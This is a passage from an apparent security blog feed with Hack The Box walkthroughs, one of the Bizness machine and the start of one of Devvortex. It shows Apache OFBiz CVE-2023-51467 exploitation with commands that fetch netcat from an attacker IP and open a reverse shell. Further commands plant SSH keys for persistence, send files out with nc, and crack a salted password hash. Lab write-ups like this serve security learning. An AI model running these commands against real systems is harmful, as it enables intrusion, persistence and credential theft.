| ssl-cert: Subject: <span class="nv">organizationName</span><span class="o">=</span>Internet Widgits Pty Ltd/stateOrProvinceName<span class="o">=</span>Some-State/countryName<span class="o">=</span>UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>66.11 seconds
                                                                
</code></pre></div></div> <h3 id="findings">Findings</h3> <ol> <li>Three ports open: <ul> <li>22</li> <li>80</li> <li>443</li> </ul> </li> <li>Domain name http://bizness.htb</li> </ol> <h2 id="domain-enumeration">Domain enumeration</h2> <p>The domain <code class="language-plaintext highlighter-rouge">bizness.htb</code> can be added to the local hosts file:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.129.8.141 bizness.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
</code></pre></div></div> <p>This makes it reachable and reveals a simple landing page:</p> <p><img src="/assets/img/20240123-bizness/20240123-page.png" alt="20240123-page.png" class="auto-resize"/></p> <p>At the bottom of the page, it states the site is powered by <strong>Apache OFBiz</strong>.</p> <p><img src="/assets/img/20240123-bizness/20240123-pagepower.png" alt="20240123-pagepower.png" class="auto-resize"/></p> <h3 id="what-is-apache-ofbiz">What is Apache OFBiz</h3> <p>Apache OFBiz (Open For Business) is an open-source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise. OFBiz includes modules for inventory management, order management, customer relationship management (CRM), e-commerce, accounting, and supply chain management, among others.</p> <p>A Google search for <em>Apache OFBiz vulnerabilities</em> returns a critical zero-day (CVE-2023-51467).</p> <h3 id="what-is-cve-2023-51467">What is CVE-2023-51467</h3> <p>CVE-2023-51467 is a critical vulnerability in Apache OFBiz, involving an authentication bypass with a CVSS score of 9.8. The vulnerability, particularly affecting the <code class="language-plaintext highlighter-rouge">/webtools/control/ping</code> HTTP endpoint, allows unauthorised access without authentication.</p> <p>While initially demonstrating the vulnerability’s existence, further analysis revealed its potential for arbitrary code execution, including executing payloads directly from memory. This flaw enables attackers not only to bypass authentication but also to potentially exploit Server-Side Request Forgery (SSRF) vulnerabilities.</p> <hr/> <h2 id="apache-ofbiz-enumeration">Apache OFBiz enumeration</h2> <p>Without knowing the version of Apache OFBiz, it is unclear whether the target is vulnerable to the zero-day. However, a search of GitHub revealed numerous PoCs to scan a target to confirm or deny if the ERP is vulnerable.</p> <p>One such scanner is <a href="https://github.com/Chocapikk/CVE-2023-51467"> Chocapikk/CVE-2023-51467: Apache OfBiz Auth Bypass Scanner for CVE-2023-51467</a>, which was used to confirm the target is, in fact, vulnerable.</p> <p>First the scanner is cloned from the repository and the dependencies installed.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>git clone https://github.com/Chocapikk/CVE-2023-51467.git

pip <span class="nb">install</span> <span class="nt">-r</span> requirements.txt 
</code></pre></div></div> <p>Then the scanner can be executed by passing the domain and an output location. The output location is useful if a list of domains were being scanned. As the output shows, the <code class="language-plaintext highlighter-rouge">bizness.htb</code> is indeed vulnerable.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python exploit.py <span class="nt">-u</span> bizness.htb <span class="nt">-o</span> ~/Documents/htb-machines/bizness/scans/output.txt
<span class="o">[</span>00:00:49] Vulnerable URL found: bizness.htb, Response: PONG                                                                                                                  exploit.py:53
|████████████████████████████████████████| 1/1 <span class="o">[</span>100%] <span class="k">in </span>3.3s <span class="o">(</span>0.30/s<span class="o">)</span> 

</code></pre></div></div> <hr/> <h1 id="exploitation">Exploitation</h1> <p>Another exploit scanner which includes an exploit POC as well was found.</p> <p>Using <a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass">jakabakos/Apache-OFBiz-Authentication-Bypass</a> the target was reconfirmed to be vulnerable.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>python3 exploit.py <span class="nt">--url</span> http://bizness.htb                                                                                                          │
<span class="o">[</span>+] Scanning started...                                                                                                                                  │
<span class="o">[</span>+] Apache OFBiz instance seems to be vulnerable.  
</code></pre></div></div> <p>This particular POC included the exploit itself, which will provide <strong>remote code execution</strong> on the target. Theoretically this can be leveraged to induce the server to request a payload from a malicious server. In this instance, it can be used to move <code class="language-plaintext highlighter-rouge">netcat</code> onto the target to establish a reverse-shell.</p> <p>To do this <code class="language-plaintext highlighter-rouge">nc</code> can be copied to a working directory:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /usr/bin/nc ./
</code></pre></div></div> <p>Then a simple python webserver can be started to serve the binary:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div> <p>Once <code class="language-plaintext highlighter-rouge">netcat</code> is ready to be served, the exploit can be used to remotely execute a command on the target to fetch binary:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py <span class="nt">--url</span> http://bizness.htb <span class="nt">--cmd</span> <span class="s2">"wget http://10.10.14.5/nc"</span>  

<span class="o">[</span>+] Generating payload...                                                               
Picked up _JAVA_OPTIONS: <span class="nt">-Dawt</span>.useSystemAAFontSettings<span class="o">=</span>on <span class="nt">-Dswing</span>.aatext<span class="o">=</span><span class="nb">true</span>           
<span class="o">[</span>+] Payload generated successfully.                                                     
<span class="o">[</span>+] Sending malicious serialized payload...                                             
<span class="o">[</span>+] The request has been successfully sent. Check the result of the command.   
</code></pre></div></div> <p>Now that <code class="language-plaintext highlighter-rouge">netcat</code> is on the target, a listener can be established on a local machine to receive a reverse-shell.<sup><a href="#note1" id="ref1">1</a></sup></p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lvnp</span> 4321
</code></pre></div></div> <p>Once a listener is active, a subsequent command can be sent to the target which will execute <code class="language-plaintext highlighter-rouge">netcat</code> on the target to establish the reverse shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py <span class="nt">--url</span> https://bizness.htb <span class="nt">--cmd</span> <span class="s2">"nc 10.10.14.5 4321 -c /bin/bash"</span>
</code></pre></div></div> <p>The reverse shell is then caught by the listener.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lvnp</span> 4321  
listening on <span class="o">[</span>any] 4321 ...
connect to <span class="o">[</span>10.10.14.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.8.141] 38270
<span class="nb">whoami
</span>ofbiz
</code></pre></div></div> <p>Once the reverse-shell is established, it can be upgraded with a simple python script to improve the interactivity.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="sh">"</span><span class="s">import pty;pty.spawn(</span><span class="sh">'</span><span class="s">/bin/bash</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span>
</code></pre></div></div> <p>A quick look around and the first flag is found.</p> <p><img src="/assets/img/20240123-bizness/20240123-userflag.png" alt="20240123-userflag.png" class="auto-resize"/></p> <hr/> <h1 id="establishing-persistence">Establishing persistence</h1> <p>It can be helpful to establish persistence on a target to ensure it can be easily accessed without having to exploit it again through the initial vulnerability. This can help evade detection and ensure access in the event the initial attack vector is mitigated.</p> <p>One way to do this is to place an <strong>authorized ssh key</strong> on the target.</p> <p>To do this, the <code class="language-plaintext highlighter-rouge">.ssh</code> folder is required in the <code class="language-plaintext highlighter-rouge">/home/ofbiz</code> directory.</p> <p>Within this folder an <code class="language-plaintext highlighter-rouge">authorized_keys</code> file is needed.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> .ssh

<span class="nb">cd</span> .ssh

<span class="nb">touch </span>authorized_keys
</code></pre></div></div> <p>On the machine from which the target will be accessed, <strong>ssh keys</strong> are required.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen

Generating public/private rsa key pair.
Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/home/ofbiz/.ssh/id_rsa<span class="o">)</span>: 

Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>: 

Enter same passphrase again: 

Your identification has been saved <span class="k">in</span> /home/ofbiz/.ssh/id_rsa
Your public key has been saved <span class="k">in</span> /home/ofbiz/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:&lt;REDACTED&gt;+
</code></pre></div></div> <p>Then the public key needs to be copied over and placed in the <code class="language-plaintext highlighter-rouge">/home/ofbiz/.ssh/authorized_keys</code> file. This can be achieved with:</p> <p><code class="language-plaintext highlighter-rouge">echo "contents-of-public-key" &gt; /home/ofbiz/.ssh/authorized_keys</code></p> <p>Then the private key needs <code class="language-plaintext highlighter-rouge">chmod 600 id_rsa</code> permission, which will enable ssh login with:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> /path/to/private0-key ofbiz@IP
</code></pre></div></div> <p>As long as the key remains in the authorized_keys file, this method can be used to return to the target as required.</p> <hr/> <h1 id="system-enumeration">System enumeration</h1> <p>Enumerating the system for a vector to achieve privilege escalation was rather challenging for an easy box.</p> <h2 id="linepeas">Linepeas</h2> <p>A good starting point is to move <code class="language-plaintext highlighter-rouge">linpeas</code> onto the system and execute it. The binary can be moved over using the <code class="language-plaintext highlighter-rouge">python -m http.server</code>.</p> <p>Once there it can be ran with:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash linpeas.sh | <span class="nb">tee </span>output.txt
</code></pre></div></div> <p>This will send the output to both the console and a txt file for later review.</p> <p>The output can be sent back to a local machine using <code class="language-plaintext highlighter-rouge">netcat</code> again.</p> <p>Firstly start another <code class="language-plaintext highlighter-rouge">netcat</code> listener on the receiving machine:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> <span class="nt">-p</span> 4321 <span class="o">&gt;</span> ~/path/to/a/receiving/file.txt
</code></pre></div></div> <p>Then, on the target, send the file using:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 10.10.14.5 4321 &lt; output.txt
</code></pre></div></div> <p>This series of commands essentially streams the contents of the output.txt on the target machine, back to the output.txt file on the receiving machine.</p> <h2 id="file-searching">File searching</h2> <p>Reviewing the Linpeas output eventually leads to a writeable directory <code class="language-plaintext highlighter-rouge">/opt/ofbiz/runtime/data/derby</code></p> <p>After much reading, it was found in an <a href="https://cwiki.apache.org/confluence/display/OFBIZ/Apache+OFBiz+Technical+Production+Setup+Guide">Apache wiki</a> that OFBiz uses an embedded Java database called <strong>Derby</strong>.</p> <p><img src="/assets/img/20240123-bizness/20240123-wikiresearch.png" alt="20240123-wikiresearch.png" class="auto-resize"/></p> <p>After reviewing the file system structure, an interesting README is located: inside the database directory.</p> <p><img src="/assets/img/20240123-bizness/20240123-readme-warning.png" alt="20240123-readme-warning.png" class="auto-resize"/></p> <p>The <code class="language-plaintext highlighter-rouge">seg0</code> database contains a number of .dat files.</p> <blockquote> <p><em>ChatGPT was kind enough to explain that .dat files in the context of Apache OFBiz are used for data loading purposes. Given the README notice, it’s possible that these files might contain credentials.</em></p> </blockquote> <p>The command <code class="language-plaintext highlighter-rouge">find seg0 -type f -exec cat {} \; &gt; dir.txt</code> can be used to create a file that contains the combined contents of all the files found in the <code class="language-plaintext highlighter-rouge">seg0</code> directory and its subdirectories.<sup><a href="#note2" id="ref2">2</a></sup></p> <p>This can be useful for consolidating data or logs spread across multiple files into a single document for easier analysis or review.</p> <p>The command <code class="language-plaintext highlighter-rouge">strings dir.txt | grep SHA</code> can then be used to extract printable strings from the consolidated file and search for any occurrence of text. After many attempts, the string “SHA” was tried.</p> <p>This revealed a hash.</p> <p><img src="/assets/img/20240123-bizness/20240123-hash.png" alt="20240123-hash.png" class="auto-resize"/></p> <p>The hash has a salt and would need to be converted to hexadecimal to be cracked by Hashcat.</p> <p>Despite trying to do this with the help of ChatGPT, I was unable to obtain a hash that was suitable for Hashcat.</p> <p>In the end, I found a python script that was able to do this, thanks to this <a href="https://medium.com/@mastercode112/htb-bizness-easy-writeup-bacce3ba0969">write up</a>.</p> <p>The script is:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">hashlib</span>  
<span class="kn">import</span> <span class="n">base64</span>  
<span class="kn">import</span> <span class="n">os</span>  
<span class="k">def</span> <span class="nf">cryptBytes</span><span class="p">(</span><span class="n">hash_type</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>  
<span class="k">if</span> <span class="ow">not</span> <span class="n">hash_type</span><span class="p">:</span>  
<span class="n">hash_type</span> <span class="o">=</span> <span class="sh">"</span><span class="s">SHA</span><span class="sh">"</span>  
<span class="k">if</span> <span class="ow">not</span> <span class="n">salt</span><span class="p">:</span>  
<span class="n">salt</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>  
<span class="n">hash_obj</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">hash_type</span><span class="p">)</span>  
<span class="n">hash_obj</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">salt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>  
<span class="n">hash_obj</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>  
<span class="n">hashed_bytes</span> <span class="o">=</span> <span class="n">hash_obj</span><span class="p">.</span><span class="nf">digest</span><span class="p">()</span>  
<span class="n">result</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">$</span><span class="si">{</span><span class="n">hash_type</span><span class="si">}</span><span class="s">$</span><span class="si">{</span><span class="n">salt</span><span class="si">}</span><span class="s">$</span><span class="si">{</span><span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">hashed_bytes</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span>  
<span class="k">return</span> <span class="n">result</span>  
<span class="k">def</span> <span class="nf">getCryptedBytes</span><span class="p">(</span><span class="n">hash_type</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>  
<span class="k">try</span><span class="p">:</span>  
<span class="n">hash_obj</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">hash_type</span><span class="p">)</span>  
<span class="n">hash_obj</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">salt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>  
<span class="n">hash_obj</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>  
<span class="n">hashed_bytes</span> <span class="o">=</span> <span class="n">hash_obj</span><span class="p">.</span><span class="nf">digest</span><span class="p">()</span>  
<span class="k">return</span> <span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">hashed_bytes</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">)</span>  
<span class="k">except</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">NoSuchAlgorithmException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>  
<span class="k">raise</span> <span class="nc">Exception</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error while computing hash of type </span><span class="si">{</span><span class="n">hash_type</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>  
<span class="n">hash_type</span> <span class="o">=</span> <span class="sh">"</span><span class="s">SHA1</span><span class="sh">"</span>  
<span class="n">salt</span> <span class="o">=</span> <span class="sh">"</span><span class="s">d</span><span class="sh">"</span>  
<span class="n">search</span> <span class="o">=</span> <span class="sh">"</span><span class="s">REDACTED</span><span class="sh">"</span>  
<span class="n">wordlist</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/usr/share/wordlists/rockyou.txt</span><span class="sh">'</span>  
<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">,</span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="sh">'</span><span class="s">latin-1</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">password_list</span><span class="p">:</span>  
<span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">password_list</span><span class="p">:</span>  
<span class="n">value</span> <span class="o">=</span> <span class="n">password</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>  
<span class="n">hashed_password</span> <span class="o">=</span> <span class="nf">cryptBytes</span><span class="p">(</span><span class="n">hash_type</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">value</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>  
<span class="c1"># print(hashed_password)  
</span><span class="k">if</span> <span class="n">hashed_password</span> <span class="o">==</span> <span class="n">search</span><span class="p">:</span>  
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Found Password:</span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s">, hash:</span><span class="si">{</span><span class="n">hashed_password</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div> <p>This script reads through a list of potential passwords (<code class="language-plaintext highlighter-rouge">rockyou.txt</code>), hashes each one using the specified algorithm and salt, and then compares the resulting hash to a target hash. If a match is found, it prints the plaintext password along with its hash.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$python3</span> solve.py 
Found Password:REDACTED, <span class="nb">hash</span>:<span class="nv">$SHA1$d$uP0_QaVBpDWFeo8</span><span class="nt">-REDACTED</span><span class="o">=</span>

</code></pre></div></div> <p>Switching to <code class="language-plaintext highlighter-rouge">root</code> and trying the password works, and the root flag is obtained.</p> <p><img src="/assets/img/20240123-bizness/20240123-rootflag.png" alt="20240123-rootflag.png" class="auto-resize"/></p> <h1 id="footnotes">Footnotes</h1> <ol> <li id="note1"> <a href="#ref1">↩</a> The command <code>rlwrap -cAr nc -lvnp 9010</code> is a combination of several utilities and options that are commonly used in reverse shell setups. Here's a breakdown of the command: <ul> <li><strong><code>rlwrap</code></strong>: <ul> <li>This is a utility that provides readline capabilities to commands that may not have them. Readline allows for command line editing, persistent history, and auto-completion. In the context of this command, <code>rlwrap</code> is used to enhance the functionality of <code>nc</code> (Netcat).</li> </ul> </li> <li><strong><code>-cAr</code></strong>: These are options for <code>rlwrap</code>: <ul> <li><code>-c</code>: Enables command completion.</li> <li><code>-A</code>: Enables command auto-completion.</li> <li><code>-r</code>: Keeps a history of commands.</li> </ul> </li> <li><strong><code>-lvnp 4321</code></strong>: These are options for <code>nc</code>: <ul> <li><code>-l</code>: Puts Netcat into listening mode, where it waits for incoming connections.</li> <li><code>-v</code>: Verbose mode. Netcat will provide more information about what it's doing.</li> <li><code>-n</code>: No DNS. Tells Netcat not to resolve hostnames via DNS. This can speed up operations if DNS resolution is not required.</li> <li><code>-p 4321</code>: Specifies the port number on which Netcat will listen for incoming connections.</li> </ul> </li> </ul> So, putting it all together, <code>rlwrap -cAr nc -lvnp 4321</code> runs Netcat in listening mode on port 4321 with enhanced readline capabilities provided by <code>rlwrap</code>. This setup is typically used when you're expecting to receive a reverse shell, and you want the ability to interact with that shell more effectively using command history and completion. </li> <li id="note2"> <a href="#ref2">↩</a> <ul> <li><strong><code>find seg0 -type f</code></strong>: <ul> <li><code>find</code>: This is a command used to search for files in a directory hierarchy.</li> <li><code>seg0</code>: This specifies the directory where the <code>find</code> command starts its search. In this case, it's looking in the <code>seg0</code> directory.</li> <li><code>-type f</code>: This option tells <code>find</code> to look for files (not directories).</li> </ul> </li> <li><strong><code>-exec cat {} \;</code></strong>: <ul> <li><code>-exec</code>: This option of the <code>find</code> command allows you to execute another command on each of the files found.</li> <li><code>cat {}</code>: This is the command that <code>find</code> will execute on each file. <code>cat</code> is a standard Unix utility that reads files and outputs their content. The <code>{}</code> is a placeholder for each file <code>find</code> locates.</li> <li><code>\;</code>: This is a delimiter that indicates the end of the <code>exec</code> command.</li> </ul> </li> <li><strong><code>&gt; dir.txt</code></strong>: <ul> <li><code>&gt;</code>: This is an output redirection operator in Unix/Linux. It directs the output from the preceding command to a file.</li> <li><code>dir.txt</code>: This is the file into which the output of the previous commands will be saved.</li> </ul> </li> </ul> </li> </ol>]]></content><author><name></name></author><category term="HTB-Machines"/><category term="easy-box"/><category term="HTB"/><category term="CTF"/><category term="SSRF"/><category term="authentication-bypass"/><category term="persistence"/><category term="linpeas"/><summary type="html"><![CDATA[Bizness - Hack The Box walkthrough.]]></summary></entry><entry><title type="html">Devvortex</title><link href="https://emdeh.github.io/blog/2024/devvortex-walkthrough/" rel="alternate" type="text/html" title="Devvortex"/><published>2024-01-15T14:14:00+00:00</published><updated>2024-01-15T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2024/devvortex-walkthrough</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/devvortex-walkthrough/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>Devvortex is an easy Linux box. It involves enumerating a domain to reveal a Content Management System called <em>Joomla</em>.</p> <p>An exploit is then used to perform an <strong>Unauthenticated Information Disclosure.</strong></p> <p>This results in stealing MySQL credentials which are <strong>re-used</strong> to authenticate to the Joomla admin panel.</p> <p>From there a reverse shell is obtained by modifying the <code class="language-plaintext highlighter-rouge">login.php</code>. Once the reverse shell is established the MySQL database is enumerated to obtain two hashes. Once a hash is cracked, SSH is used to log on.</p> <p><strong>Privilege escalation</strong> is achieved by exploiting a vulnerability in the <code class="language-plaintext highlighter-rouge">apport-cli</code> utility, which the user has <code class="language-plaintext highlighter-rouge">sudo</code> rights over. This ultimately spawns a privileged shell.</p> <h2 id="methods">Methods</h2> <h3 id="unauthenticated-information-disclosure">Unauthenticated information disclosure</h3> <p>Unauthenticated Information Disclosure refers to a security vulnerability where sensitive information is exposed without requiring authentication. It means that confidential data, such as personal details, configuration files, or database records, can be accessed by anyone without needing to log in or bypass security controls.</p> <p>This type of vulnerability often arises due to misconfigurations or flawed programming in web applications or services. It poses a significant risk because it can lead to data breaches and further exploitation.</p> <p>In this case, an outdated Joomla version was exploited to obtain clear-text credentials.</p> <blockquote> <p><strong>Mitigation:</strong> Ensure sensitive information is not vulnerable to unauthenticated disclosure, keep systems patched, and encrypt sensitive data.</p> </blockquote> <h3 id="credential-stuffing">Credential stuffing</h3> <p>Credential stuffing is a type of attack where stolen account credentials (usernames or email addresses and passwords) from one breach are used to attempt access to accounts on other websites. This attack relies on the fact that many people reuse the same login credentials across multiple sites. It’s a widespread method for gaining unauthorised access due to the commonality of password reuse.</p> <p>In this case, the credentials from the information disclosure were re-used to obtain access to the Joomla administrator panel.</p> <blockquote> <p><strong>Mitigation:</strong> Ensure passwords are not re-used across different services.</p> </blockquote> <h3 id="password-cracking">Password cracking</h3> <p>Password cracking is the process of attempting to gain unauthorised access to restricted systems by figuring out the password. It often involves the use of software that employs various methods (like brute-force attacks, dictionary attacks, or rainbow table attacks) to guess passwords. This technique can be used against individual accounts or to decrypt encrypted data. The complexity and time it takes to crack a password can vary significantly based on the password’s strength and the method used.</p> <p>In this case, the hashes stolen from the MySQL database were cracked with <code class="language-plaintext highlighter-rouge">hashcat</code>.</p> <p><strong>Mitigation:</strong> Ensure complex passwords are used.</p> <h1 id="enumeration">Enumeration</h1> <p>Enumeration, as always starts with Nmap.</p> <h2 id="nmap-scanning">Nmap scanning</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.129.15.24 <span class="nt">-oN</span> - | <span class="nb">tee </span>devvortex-initial-scan.txt
</code></pre></div></div> <blockquote> <p><em>To output Nmap scan results to a file while also displaying them in the terminal, you can use the <code class="language-plaintext highlighter-rouge">-oN</code> option along with the <code class="language-plaintext highlighter-rouge">tee</code> command in Linux. The <code class="language-plaintext highlighter-rouge">-oN</code> option in Nmap is used to output the scan results to a file in a normal, human-readable format. The <code class="language-plaintext highlighter-rouge">tee</code> command in Unix-like operating systems reads from standard input and writes to both standard output and one or more files simultaneously.</em></p> </blockquote> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.94SVN scan initiated Sun Jan 14 23:30:42 2024 as: nmap -sC -sV -oN - 10.129.15.24
Nmap scan report for 10.129.15.24
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 14 23:31:37 2024 -- 1 IP address (1 host up) scanned in 54.86 seconds
</code></pre></div></div> <h3 id="findings">Findings</h3> <ol> <li>Two ports open, 22 and 80.</li> <li>Domain name http://devvortex.htb/ found.</li> </ol> <h2 id="subdomain-scanning">Subdomain scanning</h2> <p>Adding the domain to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file allows for the site to be browsed and reveals a landing page.</p> <p><img src="/assets/img/20240115-devvortext-landingpage1.png" alt="20240115-devvortext-landingpage1.png" class="auto-resize"/></p> <p>The site was then scanned for subdomains.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-u</span> http://devvortex.htb/ <span class="nt">-H</span> <span class="s1">'Host:FUZZ.devvortex.htb'</span> <span class="nt">-t</span> 50 <span class="nt">--hc</span> 302 <span class="o">&gt;</span> subdomain-scan.txt | <span class="nb">tee</span>
</code></pre></div></div> <ul> <li>The <code class="language-plaintext highlighter-rouge">-t 50</code> instructs wfuzz to have up to 50 concurrent connections which will speed up the scan.</li> <li>The <code class="language-plaintext highlighter-rouge">--hc 302</code> flag stands for “Hide Code”. This option instructs wfuzz not to display results with the 302 status code. This can be helpful to filter out some of the redirection noise.</li> </ul> <h3 id="findings-1">Findings</h3> <p>The subdomain <code class="language-plaintext highlighter-rouge">dev</code> was identified.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devvortex.htb/
Total requests: 19966
=====================================================================
ID           Response   Lines    Word       Chars       Payload                         
=====================================================================

000000019:   200        501 L    1581 W     23221 Ch    "dev"                           

Total time: 0
Processed Requests: 19966
Filtered Requests: 19965
Requests/sec.: 0
</code></pre></div></div> <p>This is added to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> to allow the site to be browsed.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/HTB-Machines/devvortex/scans]
└─<span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
&lt;SNIP&gt;
10.129.15.24    devvortex.htb dev.devvortex.htb
